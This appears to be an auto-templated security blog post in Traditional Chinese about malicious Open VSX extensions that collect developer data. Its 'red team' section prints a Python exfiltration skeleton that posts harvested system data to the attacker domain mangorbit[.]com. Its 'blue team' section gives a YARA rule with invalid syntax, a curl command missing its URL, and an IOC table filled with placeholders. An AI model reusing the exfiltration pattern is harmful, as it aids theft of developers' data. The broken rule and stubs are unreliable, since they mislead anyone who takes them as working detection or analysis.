---
layout: post
title:  "77 Open VSX extensions found harvesting developer info"
date:   2026-08-04 19:23:53 +0000
categories: [security]
severity: high
---

# 🔥 解析 Open VSX 市場的「邪惡雙胞胎」擴充套件攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `Data Exfiltration`, `Malicious Extensions`, `Reconnaissance`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Open VSX 市場的擴充套件驗證機制存在漏洞，允許惡意開發者創建假冒的擴充套件。
* **攻擊流程圖解**:
  1. 惡意開發者創建假冒的擴充套件，並上傳到 Open VSX 市場。
  2. 用戶安裝假冒的擴充套件。
  3. 擴充套件收集用戶的系統信息和開發環境數據。
  4. 擴充套件將收集到的數據傳送到惡意伺服器。
* **受影響元件**: Open VSX 市場的擴充套件，特別是那些使用了 `mangorbit[.]com` 伺服器的擴充套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 惡意開發者需要創建假冒的擴充套件，並上傳到 Open VSX 市場。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 收集用戶的系統信息和開發環境數據
    def collect_data():
        # ...
        return data
    
    # 將收集到的數據傳送到惡意伺服器
    def send_data(data):
        url = "https://mangorbit[.]com/collect"
        requests.post(url, json=data)
    
    # 主要邏輯
    def main():
        data = collect_data()
        send_data(data)
    
    if __name__ == "__main__":
        main()
    
    ```
* **範例指令**: `curl -X POST -H "Content-Type: application/json" -d '{"data": "..."}`

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | mangorbit[.]com | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Open_VSX_Malicious_Extension {
        meta:
            description = "Detects malicious Open VSX extensions"
            author = "..."
        strings:
            $mangorbit = "mangorbit[.]com"
        condition:
            $mangorbit in (http_request / "Host")
    }
    
    ```
* **緩解措施**: 刪除假冒的擴充套件，封鎖 `mangorbit[.]com` 伺服器。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Data Exfiltration (數據外泄)**: 惡意程式或攻擊者從系統中收集和傳送敏感數據的過程。
* **Malicious Extensions (惡意擴充套件)**: 假冒的擴充套件，旨在收集用戶的系統信息和開發環境數據。
* **Reconnaissance (偵察)**: 攻擊者收集目標系統或網路的信息，以便進行進一步的攻擊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/77-open-vsx-extensions-found-harvesting-developer-info/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1005/)


